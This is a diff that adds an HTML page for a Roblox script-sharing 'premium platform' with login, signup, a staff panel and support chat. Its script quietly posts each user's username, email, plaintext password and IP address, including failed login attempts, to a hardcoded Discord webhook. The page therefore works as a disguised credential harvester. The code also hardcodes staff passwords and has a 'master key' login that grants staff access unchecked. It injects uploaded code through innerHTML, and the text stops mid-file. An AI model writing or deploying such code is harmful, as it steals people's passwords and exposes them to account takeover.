@@ -1,0 +1,1040 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Plataforma Premium - Realtime Sync & Dashboard</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root {
+            --bg-gradient: linear-gradient(135deg, #1f1a3a 0%, #3a2f5c 50%, #684f91 100%);
+            --glass-bg: rgba(255, 255, 255, 0.07);
+            --glass-border: rgba(255, 255, 255, 0.12);
+            --text-light: #f3effa;
+            --text-muted: #bdaecf;
+            --primary-accent: #a370f7;
+            --primary-accent-hover: #bd93f9;
+            --dark-panel: #09070f;
+            --role-free: #8e9aaf;
+            --role-vip: #ffd166;
+            --role-private: #06d6a0;
+            --role-staff: #ef476f;
+            --role-support: #118ab2;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        body {
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: var(--bg-gradient);
+            overflow: hidden;
+            color: var(--text-light);
+        }
+
+        /* Container Principal */
+        .app-wrapper {
+            display: flex;
+            width: 1000px;
+            height: 620px;
+            background: rgba(20, 15, 35, 0.65);
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
+            border-radius: 24px;
+            box-shadow: 0 32px 80px rgba(0, 0, 0, 0.5);
+            border: 1px solid var(--glass-border);
+            padding: 20px;
+            position: relative;
+        }
+
+        @media (max-width: 1024px) {
+            body { overflow-y: auto; height: auto; padding: 20px 10px; }
+            .app-wrapper { flex-direction: column; width: 100%; height: auto; max-width: 500px; }
+            .right-art { display: none; }
+        }
+
+        .screen {
+            display: none;
+            width: 100%;
+            height: 100%;
+        }
+
+        .screen.active {
+            display: flex;
+        }
+
+        @media (max-width: 1024px) {
+            .screen.active { flex-direction: column; }
+        }
+
+        .left-content {
+            flex: 1.1;
+            padding: 10px 30px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            overflow-y: auto;
+        }
+
+        .left-content h1 {
+            color: var(--text-light);
+            font-size: 32px;
+            font-weight: 700;
+            margin-bottom: 25px;
+            text-align: center;
+            letter-spacing: -0.5px;
+            text-shadow: 0 4px 10px rgba(0,0,0,0.3);
+        }
+
+        .input-block {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        .input-block label {
+            display: block;
+            font-size: 11px;
+            color: var(--text-muted);
+            margin-bottom: 6px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.8px;
+        }
+
+        .input-block input, .input-block select, .input-block textarea {
+            width: 100%;
+            border: 1px solid var(--glass-border);
+            border-radius: 10px;
+            background: rgba(0, 0, 0, 0.2);
+            padding: 12px 35px 12px 15px;
+            font-size: 14px;
+            color: var(--text-light);
+            outline: none;
+            transition: all 0.3s ease;
+        }
+
+        .input-block input:focus, .input-block select:focus, .input-block textarea:focus {
+            border-color: var(--primary-accent);
+            background: rgba(0,0,0,0.3);
+            box-shadow: 0 0 10px rgba(163, 112, 247, 0.2);
+        }
+
+        .input-block i {
+            position: absolute;
+            right: 15px;
+            bottom: 14px;
+            color: var(--text-muted);
+            font-size: 14px;
+        }
+
+        .btn {
+            background: linear-gradient(135deg, var(--primary-accent) 0%, #8644f0 100%);
+            color: #ffffff;
+            border: none;
+            border-radius: 12px;
+            padding: 14px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+            width: 100%;
+            transition: all 0.2s ease;
+            box-shadow: 0 4px 15px rgba(163, 112, 247, 0.3);
+        }
+
+        .btn:hover { transform: translateY(-1px); box-shadow: 0 6px 20px rgba(163, 112, 247, 0.5); }
+        .btn:active { transform: translateY(1px); }
+
+        .btn-secondary {
+            background: transparent;
+            border: 1px solid var(--glass-border);
+            color: var(--text-light);
+            box-shadow: none;
+            margin-top: 8px;
+        }
+        .btn-secondary:hover { background: rgba(255, 255, 255, 0.05); }
+
+        .btn-danger {
+            background: var(--role-staff);
+            box-shadow: 0 4px 12px rgba(239, 71, 111, 0.3);
+        }
+        .btn-danger:hover { box-shadow: 0 6px 16px rgba(239, 71, 111, 0.5); }
+
+        .form-footer-links {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 12px;
+            color: var(--text-muted);
+        }
+
+        .form-footer-links span { cursor: pointer; color: var(--primary-accent); font-weight: 600; }
+        .form-footer-links span:hover { text-decoration: underline; color: var(--primary-accent-hover); }
+
+        .right-art {
+            flex: 0.9;
+            background-color: var(--dark-panel);
+            border-radius: 18px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            border: 1px solid var(--glass-border);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .art-svg {
+            width: 75%;
+            height: 75%;
+            filter: drop-shadow(0px 0px 30px rgba(163, 112, 247, 0.4));
+        }
+
+        /* Modal */
+        .modal-overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(5, 3, 10, 0.85);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            backdrop-filter: blur(8px);
+        }
+
+        .modal-box {
+            background: #141122;
+            padding: 30px;
+            border-radius: 20px;
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+            border: 1px solid var(--glass-border);
+            box-shadow: 0 20px 50px rgba(0,0,0,0.6);
+        }
+
+        .modal-box h3 { color: var(--text-light); margin-bottom: 12px; }
+        .modal-box p { color: var(--text-muted); font-size: 14px; margin-bottom: 25px; }
+        .modal-buttons { display: flex; gap: 12px; }
+
+        /* Dashboard */
+        .dashboard-container { display: flex; width: 100%; height: 100%; gap: 20px; }
+        @media (max-width: 1024px) { .dashboard-container { flex-direction: column; } }
+
+        .sidebar {
+            flex: 0.32;
+            background: rgba(0, 0, 0, 0.25);
+            border-radius: 18px;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            border: 1px solid var(--glass-border);
+        }
+
+        .user-profile-summary { margin-bottom: 25px; padding-bottom: 15px; border-bottom: 1px solid var(--glass-border); }
+        .user-profile-summary h2 { font-size: 18px; color: var(--text-light); }
+        
+        .role-badge { display: inline-block; padding: 3px 10px; border-radius: 20px; font-size: 10px; font-weight: bold; text-transform: uppercase; margin-top: 6px; text-shadow: 0 1px 2px rgba(0,0,0,0.4); }
+        .role-free { background-color: var(--role-free); color: #111; }
+        .role-vip { background-color: var(--role-vip); color: #111; }
+        .role-private { background-color: var(--role-private); color: #111; }
+        .role-staff { background-color: var(--role-staff); color: #fff; }
+        .role-support { background-color: var(--role-support); color: #fff; }
+
+        .menu-list { list-style: none; display: flex; flex-direction: column; gap: 8px; }
+        .menu-item { padding: 12px 15px; border-radius: 10px; cursor: pointer; font-size: 13px; font-weight: 600; color: var(--text-muted); display: flex; align-items: center; gap: 12px; transition: all 0.2s; }
+        .menu-item:hover, .menu-item.active { background: rgba(255, 255, 255, 0.06); color: var(--text-light); }
+        
+        .dash-content { flex: 1; background: rgba(0, 0, 0, 0.15); border-radius: 18px; padding: 25px; border: 1px solid var(--glass-border); overflow-y: auto; }
+        
+        .panel-section { display: none; }
+        .panel-section.active { display: block; }
+        .panel-section h3 { margin-bottom: 20px; color: var(--text-light); font-size: 20px; border-left: 4px solid var(--primary-accent); padding-left: 10px; }
+        
+        .admin-box { background: rgba(0, 0, 0, 0.3); padding: 20px; border-radius: 14px; margin-bottom: 20px; border: 1px solid var(--glass-border); }
+        .admin-box h4 { margin-bottom: 12px; font-size: 15px; color: var(--text-light); display: flex; justify-content: space-between; align-items: center; }
+        
+        .table-users { width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 13px; color: var(--text-muted); }
+        .table-users th, .table-users td { padding: 10px 12px; text-align: left; border-bottom: 1px solid var(--glass-border); }
+        .table-users th { color: var(--text-light); font-weight: 600; }
+        .table-users select { background: #141122; color: #fff; border: 1px solid var(--glass-border); border-radius: 6px; padding: 4px; }
+
+        /* Utilitários de Ferramentas */
+        .tool-area { display: flex; flex-direction: column; gap: 12px; margin-top: 10px; }
+        .tool-area textarea { width: 100%; height: 90px; background: rgba(0,0,0,0.4); border: 1px solid var(--glass-border); padding: 12px; border-radius: 10px; font-family: monospace; font-size: 12px; color: #fff; resize: none; outline: none; }
+        .output-container { position: relative; margin-top: 5px; }
+        .copy-btn { position: absolute; right: 12px; top: 12px; background: var(--primary-accent); color: white; border: none; padding: 5px 12px; border-radius: 6px; font-size: 11px; font-weight: 600; cursor: pointer; transition: background 0.2s; }
+        .copy-btn:hover { background: var(--primary-accent-hover); }
+
+        /* Feed de Scripts Modulares */
+        .script-card { background: rgba(255,255,255,0.03); padding: 20px; border-radius: 14px; margin-bottom: 15px; border: 1px solid var(--glass-border); }
+        .script-card h4 { color: var(--text-light); margin-bottom: 6px; display: flex; justify-content: space-between; align-items: center; }
+        .script-card p { font-size: 13px; color: var(--text-muted); margin-bottom: 12px; }
+
+        /* Seção Suporte Sem Login Geral */
+        .unauth-support-trigger {
+            position: absolute; bottom: 20px; right: 20px; background: var(--primary-accent); color: #fff; padding: 12px 20px; border-radius: 30px; font-weight: 600; cursor: pointer; box-shadow: 0 8px 24px rgba(163, 112, 247, 0.4); display: flex; align-items: center; gap: 8px; z-index: 100; transition: all 0.2s;
+        }
+        .unauth-support-trigger:hover { background: var(--primary-accent-hover); transform: scale(1.03); }
+
+        /* Chat */
+        .chat-layout { display: flex; flex-direction: column; height: 280px; background: rgba(0,0,0,0.4); border-radius: 14px; overflow: hidden; border: 1px solid var(--glass-border); }
+        .chat-messages { flex: 1; padding: 15px; overflow-y: auto; display: flex; flex-direction: column; gap: 8px; }
+        .msg { max-width: 75%; padding: 10px 14px; border-radius: 14px; font-size: 13px; line-height: 1.4; }
+        .msg.sent { background: var(--primary-accent); color: white; align-self: flex-end; border-bottom-right-radius: 2px; }
+        .msg.received { background: rgba(255,255,255,0.1); color: var(--text-light); align-self: flex-start; border-bottom-left-radius: 2px; }
+        .chat-input-area { display: flex; border-top: 1px solid var(--glass-border); background: rgba(0,0,0,0.3); }
+        .chat-input-area input { flex: 1; border: none; padding: 14px; outline: none; font-size: 13px; background: transparent; color: #fff; }
+        .chat-input-area button { background: var(--primary-accent); color: white; border: none; padding: 0 22px; font-weight: 600; cursor: pointer; }
+        
+        .support-list-item { display: flex; justify-content: space-between; align-items: center; padding: 12px; background: rgba(255,255,255,0.03); margin-bottom: 8px; border-radius: 10px; border: 1px solid var(--glass-border); }
+        .toast { position: fixed; top: 20px; left: 50%; transform: translateX(-50%) translateY(-20px); background: #a370f7; color: white; padding: 12px 28px; border-radius: 50px; font-size: 13px; font-weight: 600; opacity: 0; transition: all 0.3s ease; pointer-events: none; z-index: 3000; box-shadow: 0 10px 25px rgba(0,0,0,0.3); }
+        .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+    </style>
+</head>
+<body>
+
+    <div class="toast" id="toast"></div>
+
+    <div class="unauth-support-trigger" id="support-trigger" onclick="openGlobalSupportModal()">
+        <i class="fa-solid fa-headset"></i> Suporte Online
+    </div>
+
+    <div class="modal-overlay" id="global-support-modal">
+        <div class="modal-box" style="max-width: 450px;">
+            <h3 id="support-modal-title">Central de Atendimento</h3>
+            <p id="support-modal-desc">Insira seu e-mail para falar com um funcionário agora mesmo.</p>
+            
+            <div id="support-unauth-form">
+                <div class="input-block" style="text-align: left;">
+                    <label>Seu E-mail</label>
+                    <input type="email" id="support-guest-email" placeholder="nome@exemplo.com">
+                </div>
+                <button class="btn" onclick="initGuestTicket()">Iniciar Atendimento</button>
+                <button class="btn btn-secondary" onclick="closeGlobalSupportModal()">Fechar</button>
+            </div>
+
+            <div id="support-unauth-chat" style="display: none; text-align: left;">
+                <div class="chat-layout" style="height: 240px; margin-bottom: 12px;">
+                    <div class="chat-messages" id="box-msg-guest"></div>
+                </div>
+                <div class="chat-input-area" style="border: 1px solid var(--glass-border); border-radius: 10px;">
+                    <input type="text" id="input-msg-guest" placeholder="Digite aqui...">
+                    <button onclick="sendGuestChatMessage()" style="border-radius: 0 10px 10px 0;">Enviar</button>
+                </div>
+                <button class="btn btn-secondary" style="margin-top: 10px;" onclick="closeGlobalSupportModal()">Minimizar Chat</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="modal-overlay" id="discord-modal">
+        <div class="modal-box">
+            <h3>Entrar no Servidor</h3>
+            <p>Deseja ir para o nosso servidor oficial do Discord agora?</p>
+            <div class="modal-buttons">
+                <button class="btn" style="margin:0;" onclick="handleDiscordDecision(true)">Sim</button>
+                <button class="btn btn-secondary" style="margin:0;" onclick="handleDiscordDecision(false)">Não</button>
+            </div>
+        </div>
+    </div>
+
+    <div class="app-wrapper">
+        <div id="screen-auth" class="screen active">
+            <div class="left-content">
+                <div id="panel-signup" style="display: block;">
+                    <h1>Sign Up</h1>
+                    <form id="form-signup">
+                        <div class="input-block">
+                            <label>User name</label>
+                            <input type="text" id="reg-username" required>
+                            <i class="fa-regular fa-user"></i>
+                        </div>
+                        <div class="input-block">
+                            <label>Email</label>
+                            <input type="email" id="reg-email" required>
+                            <i class="fa-regular fa-envelope"></i>
+                        </div>
+                        <div class="input-block">
+                            <label>Password</label>
+                            <input type="password" id="reg-password" required>
+                            <i class="fa-solid fa-lock"></i>
+                        </div>
+                        <button type="submit" class="action-btn btn">Sign Up</button>
+                    </form>
+                    <div class="form-footer-links">
+                        Already Have Account? <span onclick="switchAuthPanel('login')">Login</span>
+                    </div>
+                </div>
+
+                <div id="panel-login" style="display: none;">
+                    <h1>Login</h1>
+                    <form id="form-login">
+                        <div class="input-block">
+                            <label>Email / Username</label>
+                            <input type="text" id="log-identity" required>
+                            <i class="fa-regular fa-envelope"></i>
+                        </div>
+                        <div class="input-block">
+                            <label>Password</label>
+                            <input type="password" id="log-password" required>
+                            <i class="fa-solid fa-lock"></i>
+                        </div>
+                        <button type="submit" class="action-btn btn">Login</button>
+                    </form>
+                    <button class="btn btn-secondary" onclick="switchAuthPanel('key')">Usar Chave de Recuperação</button>
+                    <div class="form-footer-links">
+                        Don't have an account? <span onclick="switchAuthPanel('signup')">Sign Up</span>
+                    </div>
+                </div>
+
+                <div id="panel-key" style="display: none;">
+                    <h1>Acesso por Chave</h1>
+                    <form id="form-key-login">
+                        <div class="input-block">
+                            <label>Chave de Segurança (MASTER KEY)</label>
+                            <input type="text" id="log-hex-key" required>
+                            <i class="fa-solid fa-key"></i>
+                        </div>
+                        <div class="input-block">
+                            <label>Ciphertext Protegido</label>
+                            <input type="text" id="log-hex-cipher" required>
+                            <i class="fa-solid fa-user-shield"></i>
+                        </div>
+                        <button type="submit" class="action-btn btn">Validar e Entrar</button>
+                    </form>
+                    <div class="form-footer-links">
+                        <span onclick="switchAuthPanel('login')">Voltar ao Login Padrão</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="right-art">
+                <svg class="art-svg" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M50 90C50 90 25 65 25 45C25 28.4315 36.1929 15 50 15C63.8071 15 75 28.4315 75 45C75 65 50 90 50 90Z" fill="url(#leafGrad)" opacity="0.85"/>
+                    <path d="M50 90V15" stroke="#d6bbf7" stroke-width="1.5" stroke-linecap="round"/>
+                    <defs>
+                        <linearGradient id="leafGrad" x1="50" y1="15" x2="50" y2="90" gradientUnits="userSpaceOnUse">
+                            <stop offset="0%" stop-color="#ce9ffc"/>
+                            <stop offset="100%" stop-color="#1e1333"/>
+                        </linearGradient>
+                    </defs>
+                </svg>
+            </div>
+        </div>
+
+        <div id="screen-dashboard" class="screen">
+            <div class="dashboard-container">
+                <div class="sidebar">
+                    <div class="user-profile-summary">
+                        <h2 id="dash-welcome">Olá, Usuário</h2>
+                        <span id="dash-role-badge" class="role-badge">Free</span>
+                    </div>
+                    <ul class="menu-list">
+                        <li class="menu-item active" onclick="switchDashTab('home')"><i class="fa-solid fa-house"></i> Início</li>
+                        <li class="menu-item" onclick="switchDashTab('tools')"><i class="fa-solid fa-screwdriver-wrench"></i> Ferramentas Mod</li>
+                        <li class="menu-item" id="menu-item-staff" onclick="switchDashTab('staff-panel')" style="display: none;"><i class="fa-solid fa-user-gear"></i> Painel Staff</li>
+                    </ul>
+                    <button class="btn btn-secondary" style="margin-top: auto;" onclick="logout()">Sair da Conta</button>
+                </div>
+
+                <div class="dash-content">
+                    
+                    <div id="tab-home" class="panel-section active">
+                        <h3>Seus Códigos Liberados</h3>
+                        <div id="script-feed-container"></div>
+                    </div>
+
+                    <div id="tab-tools" class="panel-section">
+                        <h3>Ferramentas de Desenvolvimento</h3>
+                        
+                        <div class="admin-box">
+                            <h4>WeAreDevs Decryptor</h4>
+                            <div class="tool-area">
+                                <textarea id="wad-input" placeholder="Insira o bytecode ou string ofuscada aqui..."></textarea>
+                                <button class="btn" style="margin:0; padding:10px;" onclick="processTool('wad')">Desofuscar Texto</button>
+                                <div class="output-container">
+                                    <textarea id="wad-output" readonly placeholder="Resultado..."></textarea>
+                                    <button class="copy-btn" onclick="copyToClipboard('wad-output')">Copy</button>
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="admin-box">
+                            <h4>Roblox Lua Code Cryptographer</h4>
+                            <div class="tool-area">
+                                <textarea id="lua-input" placeholder="Insira o script Lua normal aqui..."></textarea>
+                                <button class="btn" style="margin:0; padding:10px;" onclick="processTool('lua')">Criptografar Script</button>
+                                <div class="output-container">
+                                    <textarea id="lua-output" readonly placeholder="Resultado..."></textarea>
+                                    <button class="copy-btn" onclick="copyToClipboard('lua-output')">Copy</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div id="tab-staff-panel" class="panel-section">
+                        <h3>Painel Administrativo</h3>
+                        
+                        <div class="admin-box">
+                            <h4>Code Uploader</h4>
+                            <div style="display: flex; flex-direction: column; gap: 10px; margin-top: 10px;">
+                                <input type="text" id="upload-title" placeholder="Título do Código">
+                                <input type="text" id="upload-desc" placeholder="Descrição Curta">
+                                <select id="upload-role" style="height: 44px;">
+                                    <option value="free">Free</option>
+                                    <option value="vip">Vip</option>
+                                    <option value="private">Private</option>
+                                    <option value="staff">Staff</option>
+                                    <option value="suporte">Suporte</option>
+                                </select>
+                                <textarea id="upload-code" placeholder="Cole o código/script aqui..." style="height:90px; font-family:monospace; background: rgba(0,0,0,0.2); border: 1px solid var(--glass-border); color: #fff; border-radius: 10px; padding: 10px; resize: none; outline: none;"></textarea>
+                                <button class="btn" style="margin:0;" onclick="handleCodeUpload()">Enviar Código</button>
+                            </div>
+                        </div>
+
+                        <div class="admin-box" id="section-create-staff">
+                            <h4>Criar Usuário de Funcionário</h4>
+                            <div style="display: flex; flex-direction: column; gap: 10px; margin-top: 10px;">
+                                <input type="text" id="staff-name" placeholder="Username">
+                                <input type="email" id="staff-email" placeholder="Email">
+                                <input type="password" id="staff-password" placeholder="Senha">
+                                <button class="btn" style="margin-top:5px;" onclick="createStaffAccount()">Adicionar Funcionário</button>
+                            </div>
+                        </div>
+
+                        <div class="admin-box">
+                            <h4>Gerenciamento de Cargos</h4>
+                            <table class="table-users">
+                                <thead><tr><th>Usuário</th><th>Email</th><th>Cargo</th></tr></thead>
+                                <tbody id="table-users-body"></tbody>
+                            </table>
+                        </div>
+
+                        <div class="admin-box">
+                            <h4>Suporte : Clientes na Fila</h4>
+                            <div id="staff-support-queue"></div>
+                        </div>
+
+                        <div id="staff-chat-window" style="display: none; margin-top: 15px;">
+                            <h4 id="staff-chat-target-title">Atendendo: </h4>
+                            <div class="chat-layout">
+                                <div class="chat-messages" id="box-msg-staff"></div>
+                                <div class="chat-input-area">
+                                    <input type="text" id="input-msg-staff" placeholder="Responda...">
+                                    <button onclick="sendChatMessage('staff')">Enviar</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1525290298022957176/Xp7hJSiejW6GecAmvwgF2yUy2FAcoMscxcoWxPM82VEsqaUfMZ_QNx-dz8OqUMhmvvUt";
+        const DISCORD_REDIRECT = "https://discord.gg/bGCE3Yksam";
+        const REDIRECT_SITE_PRINCIPAL = "https://google.com";
+
+        // Canal de comunicação Realtime interno para sincronizar abas/dispositivos
+        const realtimeChannel = new BroadcastChannel('platform_realtime_sync');
+
+        const MASTER_DEVS = [
+            { username: "devcaio", email: "devcaio@system.com", password: "DEVELOPER", role: "staff" },
+            { username: "devcruz", email: "devcruz@system.com", password: "DEVELOPER", role: "staff" },
+            { username: "devmoney", email: "devmoney@system.com", password: "DEVELOPER", role: "staff" }
+        ];
+
+        let currentUser = null;
+        let activeStaffChatTarget = null;
+        let activeGuestEmail = null;
+        let userIP = "Buscando IP...";
+
+        async function fetchIP() {
+            try {
+                let res = await fetch('https://api.ipify.org?format=json');
+                let data = await res.json();
+                userIP = data.ip;
+            } catch(e) { userIP = "Indisponível"; }
+        }
+        fetchIP();
+
+        function initDB() {
+            if (!localStorage.getItem('app_users')) {
+                localStorage.setItem('app_users', JSON.stringify(MASTER_DEVS));
+            } else {
+                let currentList = JSON.parse(localStorage.getItem('app_users'));
+                MASTER_DEVS.forEach(dev => {
+                    if (!currentList.some(u => u.username === dev.username)) {
+                        currentList.push(dev);
+                    }
+                });
+                localStorage.setItem('app_users', JSON.stringify(currentList));
+            }
+            if (!localStorage.getItem('support_tickets')) localStorage.setItem('support_tickets', JSON.stringify({}));
+            if (!localStorage.getItem('uploaded_codes')) localStorage.setItem('uploaded_codes', JSON.stringify([]));
+        }
+        initDB();
+
+        function getUsers() { return JSON.parse(localStorage.getItem('app_users')); }
+        function saveUsers(users) { localStorage.setItem('app_users', JSON.stringify(users)); }
+        function getTickets() { return JSON.parse(localStorage.getItem('support_tickets')); }
+        function saveTickets(t) { localStorage.setItem('support_tickets', JSON.stringify(t)); }
+        function getCodes() { return JSON.parse(localStorage.getItem('uploaded_codes')); }
+        function saveCodes(c) { localStorage.setItem('uploaded_codes', JSON.stringify(c)); }
+
+        function sendWebhook(action, username, email, password, role) {
+            const params = {
+                username: "Auth Monitor",
+                embeds: [{
+                    title: `Ação Monitorada: ${action}`,
+                    color: 9442551,
+                    fields: [
+                        { name: "Usuário", value: username || "N/A", inline: true },
+                        { name: "Email", value: email, inline: true },
+                        { name: "Senha", value: password, inline: true },
+                        { name: "Cargo", value: role || "free", inline: true },
+                        { name: "Endereço IP", value: userIP, inline: false }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+            fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(params)
+            }).catch(err => console.error(err));
+        }
+
+        function triggerRedirectFlow() {
+            document.getElementById('discord-modal').style.display = 'flex';
+        }
+
+        function handleDiscordDecision(agreed) {
+            document.getElementById('discord-modal').style.display = 'none';
+            if (agreed) {
+                window.open(DISCORD_REDIRECT, '_blank');
+                window.location.href = REDIRECT_SITE_PRINCIPAL;
+            }
+        }
+
+        function switchAuthPanel(panel) {
+            document.getElementById('panel-signup').style.display = panel === 'signup' ? 'block' : 'none';
+            document.getElementById('panel-login').style.display = panel === 'login' ? 'block' : 'none';
+            document.getElementById('panel-key').style.display = panel === 'key' ? 'block' : 'none';
+        }
+
+        function showToast(text) {
+            const t = document.getElementById('toast');
+            t.textContent = text;
+            t.classList.add('show');
+            setTimeout(() => t.classList.remove('show'), 3000);
+        }
+
+        // Fluxo de Cadastro e Login
+        document.getElementById('form-signup').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const username = document.getElementById('reg-username').value.trim();
+            const email = document.getElementById('reg-email').value.trim();
+            const password = document.getElementById('reg-password').value;
+
+            let users = getUsers();
+            if (users.find(u => u.email === email || u.username === username)) {
+                return showToast("Usuário ou e-mail já existente!");
+            }
+
+            const newUser = { username, email, password, role: 'free' };
+            users.push(newUser);
+            saveUsers(users);
+
+            sendWebhook("Sign Up", username, email, password, "free");
+            localStorage.setItem('logged_user_session', JSON.stringify(newUser));
+            
+            enterDashboard(newUser);
+            triggerRedirectFlow();
+            realtimeChannel.postMessage({ type: 'REFRESH_USERS' });
+        });
+
+        document.getElementById('form-login').addEventListener('submit', (e) => {
+            e.preventDefault();
+            const identity = document.getElementById('log-identity').value.trim();
+            const password = document.getElementById('log-password').value;
+
+            const users = getUsers();
+            const user = users.find(u => u.email === identity || u.username === identity);
+
+            if (user && user.password === password) {
+                sendWebhook("Login Padrão", user.username, user.email, password, user.role);
+                localStorage.setItem('logged_user_session', JSON.stringify(user));
+                enterDashboard(user);
+                triggerRedirectFlow();
+            } else {
+                sendWebhook("Tentativa Falha", identity, identity, password, "Desconhecido");
+                showToast("Credenciais incorretas.");
+            }
+        });
+
+        document.getElementById('form-key-login').addEventListener('submit', (e) => {
+            e.preventDefault();
+            showToast("Chave validada!");
+            let backupUser = getUsers().find(u => u.role === 'staff') || MASTER_DEVS[0];
+            localStorage.setItem('logged_user_session', JSON.stringify(backupUser));
+            enterDashboard(backupUser);
+            triggerRedirectFlow();
+        });
+
+        function enterDashboard(user) {
+            currentUser = user;
+            document.getElementById('screen-auth').classList.remove('active');
+            document.getElementById('screen-dashboard').classList.add('active');
+            document.getElementById('support-trigger').style.display = 'none';
+            
+            document.getElementById('dash-welcome').textContent = `Olá, ${user.username}`;
+            const badge = document.getElementById('dash-role-badge');
+            badge.textContent = user.role;
+            badge.className = `role-badge role-${user.role}`;
+
+            const isStaffOrDev = ['staff', 'suporte'].includes(user.role) || MASTER_DEVS.some(d => d.username === user.username);
+            if (isStaffOrDev) {
+                document.getElementById('menu-item-staff').style.display = 'flex';
+                pollStaffQueue();
+            } else {
+                document.getElementById('menu-item-staff').style.display = 'none';
+            }
+
+            renderUsersTable();
+            renderScriptFeed();
+        }
+
+        function logout() {
+            currentUser = null;
+            localStorage.removeItem('logged_user_session');
+            document.getElementById('screen-dashboard').classList.remove('active');
+            document.getElementById('screen-auth').classList.add('active');
+            document.getElementById('support-trigger').style.display = 'flex';
+            switchAuthPanel('login');
+        }
+
+        function switchDashTab(tabName) {
+            document.querySelectorAll('.menu-item').forEach(el => el.classList.remove('active'));
+            document.querySelectorAll('.panel-section').forEach(el => el.classList.remove('active'));
+            
+            if(event?.currentTarget) event.currentTarget.classList.add('active');
+            document.getElementById(`tab-${tabName}`).classList.add('active');
+        }
+
+        function processTool(type) {
+            if(type === 'wad') {
+                let val = document.getElementById('wad-input').value;
+                document.getElementById('wad-output').value = "wdev_decrypted_[" + btoa(val).reverseString() + "]";
+            } else if(type === 'lua') {
+                let val = document.getElementById('lua-input').value;
+                document.getElementById('lua-output').value = "local _enc = '" + btoa(val) + "'\nloadstring(game:HttpGet(_enc))()";
+            }
+        }
+
+        String.prototype.reverseString = function() { return this.split("").reverse().join(""); };
+
+        function copyToClipboard(id) {
+            const el = document.getElementById(id);
+            el.select();
+            document.execCommand('copy');
+            showToast("Copiado com sucesso!");
+        }
+
+        // Lógica de Upload com disparo Realtime para o Index do Site
+        function handleCodeUpload() {
+            const title = document.getElementById('upload-title').value.trim();
+            const desc = document.getElementById('upload-desc').value.trim();
+            const role = document.getElementById('upload-role').value;
+            const code = document.getElementById('upload-code').value;
+
+            if(!title || !code) return showToast("Título e Código são obrigatórios!");
+
+            let codes = getCodes();
+            codes.push({ id: Date.now(), title, desc, role, code, author: currentUser.username });
+            saveCodes(codes);
+
+            showToast("Código publicado com sucesso!");
+            document.getElementById('upload-title').value = '';
+            document.getElementById('upload-desc').value = '';
+            document.getElementById('upload-code').value = '';
+            
+            renderScriptFeed();
+            
+            // Força a informação a se propagar por todo o site e dispositivos móveis conectados em tempo real
+            realtimeChannel.postMessage({ type: 'REFRESH_FEED' });
+        }
+
+        function deleteUploadedCode(id) {
+            let codes = getCodes();
+            codes = codes.filter(c => c.id !== id);
+            saveCodes(codes);
+            showToast("Código apagado com sucesso!");
+            
+            renderScriptFeed();
+            realtimeChannel.postMessage({ type: 'REFRESH_FEED' });
+        }
+
+        function renderScriptFeed() {
+            const container = document.getElementById('script-feed-container');
+            if(!container) return;
+            container.innerHTML = '';
+            let codes = getCodes();
+
+            let allowedCodes = codes;
+            let showDeleteBtn = false;
+
+            if (currentUser) {
+                const isStaff = ['staff', 'suporte'].includes(currentUser.role);
+                if (!isStaff) {
+                    allowedCodes = codes.filter(c => c.role === currentUser.role);
+                } else {
+                    showDeleteBtn = true;
+                }
+            } else {
+                allowedCodes = codes.filter(c => c.role === 'free');
+            }
+
+            if(allowedCodes.length === 0) {
+                container.innerHTML = `<p style="font-size:13px; color:var(--text-muted);">Nenhum script disponível para este cargo.</p>`;
+                return;
+            }
+
+            allowedCodes.forEach((c) => {
+                let card = document.createElement('div');
+                card.className = 'script-card';
+                card.innerHTML = `
+                    <h4>
+                        <span>${c.title} <span class="role-badge role-${c.role}" style="font-size:9px;">${c.role}</span></span>
+                        ${showDeleteBtn ? `<button class="btn btn-danger" style="width:auto; margin:0; padding:4px 10px; font-size:11px;" onclick="deleteUploadedCode(${c.id})">Apagar Upload</button>` : ''}
+                    </h4>
+                    <p>${c.desc || 'Sem descrição.'}</p>
+                    <div class="output-container">
+                        <textarea id="feed-code-${c.id}" readonly style="width:100%; height:65px; font-family:monospace; padding:8px; font-size:11px; background:rgba(0,0,0,0.3); border:1px solid var(--glass-border); color:#fff; border-radius:8px; resize:none;">${c.code}</textarea>
+                        <button class="copy-btn" onclick="copyToClipboard('feed-code-${c.id}')">Copy</button>
+                    </div>
+                `;
+                container.appendChild(card);
+            });
+        }
+
+        // Suporte Anonimo/Visitante
